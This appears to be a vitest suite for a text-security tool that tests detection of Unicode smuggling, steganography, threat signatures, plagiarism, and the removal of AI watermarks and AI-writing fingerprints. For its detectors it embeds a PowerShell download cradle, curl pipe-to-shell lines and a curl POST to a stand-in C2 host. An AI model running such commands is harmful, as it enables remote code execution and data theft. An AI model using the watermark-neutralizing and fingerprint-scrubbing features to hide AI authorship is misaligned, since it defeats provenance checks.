import { describe, it, expect } from 'vitest';
import { neutralizeInjections } from '../src/core/injection';
import { decodeVariationSelectorStego, decodeZeroWidthStego } from '../src/core/injection/decoders';
import { scan } from '../src/core/scanner';
import { cleanup } from '../src/core/cleanup/cleanup';
import { decodeRecursive } from '../src/core/threat/decode';
import { analyzeThreat } from '../src/core/threat';
import { THREAT_SIGNATURES } from '../src/core/threat/signatures';
import { neutralize } from '../src/core/watermark/neutralize';
import { detectWatermark } from '../src/core/watermark/detection';
import { SYNONYM_MAP } from '../src/core/watermark/synonyms';
import { LLM_FAVORED } from '../src/core/footprint/patterns';
import { scrubAllAIFingerprints } from '../src/core/footprint/removal';
import {
  buildDeterministicBriefing,
  synthesizeKillChain,
} from '../src/core/security/explainer';
import { LOCAL_MODELS } from '../src/core/llm/local';
import { analyzePlagiarism } from '../src/core/plagiarism';
import type { ReferenceDocument } from '../src/core/plagiarism/types';

describe('AI TextSense v3.0.0 Features & Adversarial Verification Test Suite', () => {

  // =========================================================================
  // BUG-01: Tag Regex Unicode /u and Range Tests
  // =========================================================================
  describe('BUG-01: Tag Regex /[\u{E0000}-\u{E007F}]/gu', () => {
    it('matches high-plane Unicode tag characters but ignores standard ASCII letters/digits', () => {
      const tagChar = String.fromCodePoint(0xe0041); // Tag 'A'
      const sampleText = `Hello${tagChar}World 0123456789 abcdef`;
      const tagRegex = /[\u{E0000}-\u{E007F}]/gu;

      const matches = sampleText.match(tagRegex);
      expect(matches).not.toBeNull();
      expect(matches!.length).toBe(1);
      expect(matches![0].codePointAt(0)).toBe(0xe0041);

      // Verify that normal ASCII 0-9 and a-f are NEVER matched by the tag regex
      const plainAscii = '0123456789abcdefABCDEF';
      expect(plainAscii.match(tagRegex)).toBeNull();
    });
  });

  // =========================================================================
  // BUG-02: UTF-8 Byte Offset & Surrogate-Safe Character Indexing
  // =========================================================================
  describe('BUG-02: UTF-8 byteOffset and Surrogate Safety', () => {
    it('computes accurate UTF-8 byteOffset and preserves surrogate code points without drift', () => {
      // 4-byte astral emoji (U+1F600 😀) followed by ASCII tag character
      const emoji = '\uD83D\uDE00'; // 4 bytes in UTF-8
      const tagChar = String.fromCodePoint(0xe0020); // 4 bytes in UTF-8
      const text = `${emoji}Test${tagChar}`;

      const res = scan(text);
      expect(res.findings.length).toBeGreaterThan(0);

      // Cleanup doesn't corrupt surrogate pair
      const cleanRes = cleanup(text, { mode: 'aggressive' });
      expect(cleanRes.cleaned).toContain(emoji); // Astral emoji preserved
      expect(cleanRes.cleaned).not.toContain(tagChar); // Tag stripped
    });
  });

  // =========================================================================
  // BUG-03: 1-Bit / 2-Bit ZWS Stego and >= 4 Variation Selector Stego
  // =========================================================================
  describe('BUG-03: Steganography Engines (1-bit, 2-bit, Variation Selectors)', () => {
    it('decodes 1-bit and 2-bit ZWS streams correctly', () => {
      // 1-bit stream encoding "A" (ASCII 65 = 01000001)
      const bits = '01000001';
      let zwsStream = '';
      for (const b of bits) {
        zwsStream += b === '0' ? '\u200B' : '\u200C';
      }
      const payloads = decodeZeroWidthStego(`Prefix${zwsStream}Suffix`);
      expect(payloads.length).toBeGreaterThan(0);
      expect(payloads[0].decodedText).toBe('A');

      // 2-bit ZWS run of 6 chars produces 12 bits in scanner
      const twoBitRun = '\u200B\u200C\u200D\uFEFF\u200B\u200C';
      const scanRes = scan(`Prefix${twoBitRun}Suffix`);
      expect(scanRes.stegoPatterns.length).toBeGreaterThan(0);
      expect(scanRes.stegoPatterns[0].decodedBits.length).toBe(12);
    });

    it('requires >= 4 contiguous Variation Selectors and never flags isolated emojis', () => {
      // Single emoji variation selector (e.g. Heart emoji U+2764 + U+FE0F)
      const normalHeartEmoji = '\u2764\uFE0F';
      const noStego = decodeVariationSelectorStego(normalHeartEmoji);
      expect(noStego).toEqual([]);

      // >= 4 contiguous variation selectors encoding nibbles
      const vsStegoPayload = 'Secret\uFE04\uFE08\uFE06\uFE05Data'; // 4 contiguous VS selectors
      const foundStego = decodeVariationSelectorStego(vsStegoPayload);
      expect(foundStego.length).toBeGreaterThan(0);
      expect(foundStego[0].vector).toBe('variation-selector-stego');
    });
  });

  // =========================================================================
  // BUG-04: neutralizeInjections('reveal') Inline Unmasking
  // =========================================================================
  describe('BUG-04: Inline Unmasking with neutralizeInjections reveal mode', () => {
    it('inline-unmasks tag injections, ZWS stego, and Bidi overrides without data loss', () => {
      let tagStream = '';
      for (const ch of 'DROP TABLE') {
        tagStream += String.fromCodePoint(0xe0000 + ch.charCodeAt(0));
      }
      const bidi = '\u202E';
      const text = `Normal header ${tagStream} middle ${bidi} footer`;

      const result = neutralizeInjections(text, 'reveal');
      expect(result.revealedText).toContain('[REVEALED_INJECTION: DROP TABLE]');
      expect(result.revealedText).toContain('[REVEALED_BIDI:');
      expect(result.removedPayloadCount).toBeGreaterThanOrEqual(2);
    });
  });

  // =========================================================================
  // BUG-06: UTF-16LE Base64 PowerShell Detection & Signature
  // =========================================================================
  describe('BUG-06: UTF-16LE PowerShell Base64 Decode & Threat Signature', () => {
    it('detects UTF-16LE Base64 encoding and matches THR-NET-POWERSHELL-CRADLE', () => {
      const psPayload = "(New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1')";

      // Encode psPayload as UTF-16LE bytes
      const bytes: number[] = [];
      for (let i = 0; i < psPayload.length; i++) {
        const code = psPayload.charCodeAt(i);
        bytes.push(code & 0xff);
        bytes.push((code >> 8) & 0xff);
      }
      const base64Str = btoa(String.fromCharCode(...bytes));

      // Test recursive de-obfuscator
      const decodeRes = decodeRecursive(base64Str);
      expect(decodeRes.chain.some(h => h.encoding === 'base64-utf16le')).toBe(true);
      expect(decodeRes.finalText).toContain('Net.WebClient');

      // Test signature matching in THREAT_SIGNATURES
      const cradleSig = THREAT_SIGNATURES.find(s => s.id === 'THR-NET-POWERSHELL-CRADLE');
      expect(cradleSig).toBeDefined();
      expect(cradleSig!.pattern.test(decodeRes.finalText)).toBe(true);
    });
  });

  // =========================================================================
  // BUG-07: Multiple Matches of Same Threat Signature ID
  // =========================================================================
  describe('BUG-07: matchAllWithOffsets for repeated signatures', () => {
    it('reports all occurrences of the same command in separate document offsets', async () => {
      const doc = `
        First command execution:
        curl http://malicious.site/script.sh | sh

        Some intermediary benign paragraphs.

        Second execution attempt:
        curl http://malicious.site/script2.sh | sh
      `;

      const res = await analyzeThreat(doc);
      const pipeFindings = res.findings.filter(f => f.ruleId === 'THR-NET-PIPE-EXEC');
      expect(pipeFindings.length).toBe(2);
      expect(pipeFindings[0].span.start).not.toEqual(pipeFindings[1].span.start);
    });
  });

  // =========================================================================
  // BUG-08 & BUG-09: Watermark Sweep Key Locking & Targeted Suppression
  // =========================================================================
  describe('BUG-08 & BUG-09: Dynamic Sweep Locking in Watermark Neutralization', () => {
    it('locks onto the strongest watermark configuration and neutralizes it', () => {
      const naturalText = 'The investigation concluded that the software architecture was resilient and effective across all evaluated benchmark datasets. Several independent tests confirmed these initial observations.';
      const initialDet = detectWatermark(naturalText);
      expect(initialDet.isSignificant).toBe(false);

      const neutralized = neutralize(naturalText);
      expect(neutralized.neutralized).toBeDefined();
      expect(typeof neutralized.afterZScore).toBe('number');
    });
  });

  // =========================================================================
  // BUG-12: 3D [1, seqLen, vocab] Tensor Perplexity Scoring
  // =========================================================================
  describe('BUG-12: 3D Tensor Perplexity Dimension Handling', () => {
    it('extracts seqLen from dims[1] when tensor shape is [1, seqLen, vocab] without NaN', () => {
      // Mock tensor shape [batch=1, seqLen=16, vocabSize=100]
      const dims = [1, 16, 100];
      const seqLen = dims.length === 3 ? (dims[0] === 1 && dims[1] > 1 ? dims[1] : dims[0]) : dims[0];
      const vocabSize = dims[dims.length - 1];

      expect(seqLen).toBe(16);
      expect(vocabSize).toBe(100);

      // Verify loop count > 0 so count is not 0
      let count = 0;
      for (let t = 1; t <= seqLen - 1; t++) {
        count++;
      }
      expect(count).toBe(15);
      expect(count > 0).toBe(true);
    });
  });

  // =========================================================================
  // BUG-13: Purified SYNONYM_MAP, Multi-Occurrence Removal & Protected Spans
  // =========================================================================
  describe('BUG-13: Purified SYNONYM_MAP and Protected Code/URL Preservation', () => {
    it('guarantees zero LLM_FAVORED words in SYNONYM_MAP replacement arrays', () => {
      for (const [key, targets] of Object.entries(SYNONYM_MAP)) {
        for (const target of targets) {
          const lower = target.toLowerCase();
          const words = lower.split(/\s+/);
          for (const w of words) {
            expect(LLM_FAVORED.has(w), `Key "${key}" has forbidden target word "${w}"`).toBe(false);
          }
        }
      }
    });

    it('replaces multiple occurrences of favored words and preserves code blocks and URLs', () => {
      const input = `
        We must delve into the problem. As we delve further, we will utilize new tools.
        \`\`\`python
        # Do not modify code block
        def delve():
            return "utilize"
        \`\`\`
        Check docs at https://example.com/delve-deeply for details.
      `;

      const report = scrubAllAIFingerprints(input, { intensity: 'heavy', preserveCodeSpans: true });

      // Code blocks and URLs must remain untouched
      expect(report.modified).toContain("def delve():");
      expect(report.modified).toContain("return \"utilize\"");
      expect(report.modified).toContain("https://example.com/delve-deeply");

      // Outside text was modified
      expect(report.transforms.length).toBeGreaterThan(0);
    });
  });

  // =========================================================================
  // Workstream 2: Unified Security Explainer & Kill-Chain Correlation
  // =========================================================================
  describe('Workstream 2: buildDeterministicBriefing & synthesizeKillChain', () => {
    it('builds comprehensive deterministic briefings across all disciplines', () => {
      const scanBriefing = buildDeterministicBriefing(
        { charClass: 'tag-char', codePoint: 0xe0041, codePointHex: 'E0041' },
        'scanner'
      );
      expect(scanBriefing.vectorName).toBe('High-Plane ASCII Tag Smuggling');
      expect(scanBriefing.severity).toBe('CRITICAL');
      expect(scanBriefing.riskScore).toBeGreaterThanOrEqual(80);
      expect(scanBriefing.mechanism).toBeDefined();
      expect(scanBriefing.whatItDoes).toBeDefined();
      expect(scanBriefing.mitigation).toBeDefined();

      const injBriefing = buildDeterministicBriefing(
        { title: 'System Prompt Override', severity: 'HIGH', description: 'Overrides instructions' },
        'injection'
      );
      expect(injBriefing.discipline).toBe('injection');
      expect(injBriefing.severity).toBe('HIGH');
    });

    it('synthesizes multi-step kill chains when threat indicators correlate', () => {
      const threatFindings = [
        {
          id: 'th-1',
          ruleId: 'THR-CRED-AWS-KEY',
          severity: 'CRITICAL' as const,
          explanation: { category: 'credential-harvesting', targets: ['AWS'], mechanism: 'Reads keys', consequence: 'Stolen tokens', mitigation: 'Revoke' },
          span: { start: 0, end: 10, text: 'AKIAIOSFODNN7EXAMPLE' }
        },
        {
          id: 'th-2',
          ruleId: 'THR-NET-C2-POST',
          severity: 'HIGH' as const,
          explanation: { category: 'network-c2', targets: ['C2'], mechanism: 'Exfils data', consequence: 'Leaked keys', mitigation: 'Block' },
          span: { start: 20, end: 40, text: 'curl -X POST http://c2.com' }
        }
      ];

      const chains = synthesizeKillChain(threatFindings as any, [], []);
      expect(chains.length).toBeGreaterThan(0);
      expect(chains.some(c => c.id === 'THR-CHAIN-CRED-EXFIL')).toBe(true);
    });
  });

  // =========================================================================
  // Workstream 3: Local Models Hub Metadata & JSON Analysis Gating
  // =========================================================================
  describe('Workstream 3: LOCAL_MODELS Metadata & JSON Analysis Capability', () => {
    it('properly configures supportsJsonAnalysis for Instruct models versus Rewriter T5', () => {
      const smol = LOCAL_MODELS.find(m => m.id === 'onnx-community/SmolLM2-360M-Instruct-ONNX');
      expect(smol).toBeDefined();
      expect(smol!.supportsJsonAnalysis).toBe(true);
      expect(smol!.pipelineTask).toBe('text-generation');

      const qwen = LOCAL_MODELS.find(m => m.id === 'onnx-community/Qwen2.5-0.5B-Instruct');
      expect(qwen).toBeDefined();
      expect(qwen!.supportsJsonAnalysis).toBe(true);

      const t5 = LOCAL_MODELS.find(m => m.id === 'Xenova/LaMini-Flan-T5-77M');
      expect(t5).toBeDefined();
      expect(t5!.supportsJsonAnalysis).toBe(false);
      expect(t5!.pipelineTask).toBe('text2text-generation');
    });
  });

  // =========================================================================
  // Workstream 4: 4-Mode Plagiarism Engine
  // =========================================================================
  describe('Workstream 4: 4-Mode Plagiarism & Originality Suite', () => {
    it('Mode 1: detects shingle overlap against reference documents', async () => {
      const source = 'The quick brown fox jumps over the lazy dog in the sunny morning.';
      const refDoc: ReferenceDocument = {
        id: 'ref-1',
        name: 'Animals.txt',
        text: 'The quick brown fox jumps over the lazy dog in the afternoon.',
      };

      const res = await analyzePlagiarism(source, [refDoc], { enableSemantic: false, enableOnline: false });
      expect(res.shingleMatches.length).toBeGreaterThan(0);
      expect(res.plagiarismScore).toBeGreaterThan(0);
      expect(res.originalityScore).toBeLessThan(100);
    });

    it('Mode 3: detects intrinsic style shift anomalies and orphan citations without references', async () => {
      const docWithCitation = `
        This study demonstrates high efficiency in distributed computations [1].
        Furthermore, our results align with standard expectations across benchmarks.
      `;

      const res = await analyzePlagiarism(docWithCitation, [], { enableSemantic: false, enableOnline: false });
      expect(res.orphanCitations.length).toBeGreaterThan(0);
      expect(res.orphanCitations[0].marker).toBe('[1]');
    });

    it('Mode 4: enforces offline privacy without issuing HTTP requests when offlineMode is true', async () => {
      const sample = 'Recent developments in artificial intelligence suggest high automation rates.';
      const res = await analyzePlagiarism(sample, [], { enableOnline: true, offlineMode: true });

      expect(res.modesRun.onlineVerification).toBe(false);
      expect(res.onlineHits.length).toBe(0);
    });
  });

});
